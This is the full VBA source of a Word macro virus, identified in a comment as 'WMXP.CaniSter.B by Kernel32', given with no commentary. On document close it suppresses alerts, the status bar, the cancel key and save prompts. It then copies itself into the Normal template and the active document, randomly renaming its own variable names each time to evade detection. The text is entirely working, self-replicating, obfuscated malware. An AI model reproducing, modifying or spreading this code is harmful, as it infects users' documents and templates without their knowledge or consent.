   Attribute VB_Name = "Module1"
   Private Sub Document_close() 'WMXP.CaniSter.B by Kernel32
   IFUPD01: Randomize Timer: XQVMO = (False * False): GQVQQ = (True / True): GoTo IFUPD02
   IFUPD02: Set SXCQI = VBE.ActiveCodePane.CodeModule: GoTo IFUPD03
   IFUPD03: SVJKH = SXCQI.lines(GQVQQ, SXCQI.countoflines): GoSub IFUPD12: GoTo IFUPD04
   IFUPD04: With Application: .DisplayStatusBar = XQVMO: .DisplayAlerts = wdAlertsNone: End With: GoTo IFUPD05
   IFUPD05: With Application: .EnableCancelKey = wdCancelDisabled: .Options.ConfirmConversions = XQVMO: End With: GoTo IFUPD06
   IFUPD06: With Options: .Application.ScreenUpdating = XQVMO: .SaveNormalPrompt = XQVMO: End With: GoTo IFUPD07:
   IFUPD07: Set MELCQ = Normal.ThisDocument.VBProject.vbcomponents(GQVQQ).CodeModule: GoTo IFUPD08
   IFUPD08: MELCQ.deletelines GQVQQ, MELCQ.countoflines: GoTo IFUPD09
   IFUPD09: MELCQ.addfromstring SVJKH: GoTo IFUPD10
   IFUPD10: Set PNKFC = ActiveDocument.VBProject.vbcomponents(GQVQQ).CodeModule: GoTo IFUPD11
   IFUPD11: PNKFC.deletelines GQVQQ, PNKFC.countoflines: PNKFC.addfromstring SVJKH: GoTo IFUPD18
   IFUPD12: Dim HHJHS(20) As String: GoTo IFUPD13
   IFUPD13: HHJHS(1) = "SXCQI": HHJHS(2) = "XQVMO": HHJHS(3) = "GQVQQ": GoTo IFUPD14
   IFUPD14: HHJHS(4) = "SVJKH": HHJHS(5) = "MELCQ": HHJHS(6) = "PNKFC": GoTo IFUPD15
   IFUPD15: HHJHS(7) = "HHJHS": HHJHS(8) = "IFUPD": HHJHS(9) = "AATRU": GoTo IFUPD16
   IFUPD16: AATRU = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65): GoTo IFUPD17
   IFUPD17: SVJKH = Replace(SVJKH, HHJHS(Int(Rnd * 9) + 1), AATRU): Return
   IFUPD18: End
   End Sub
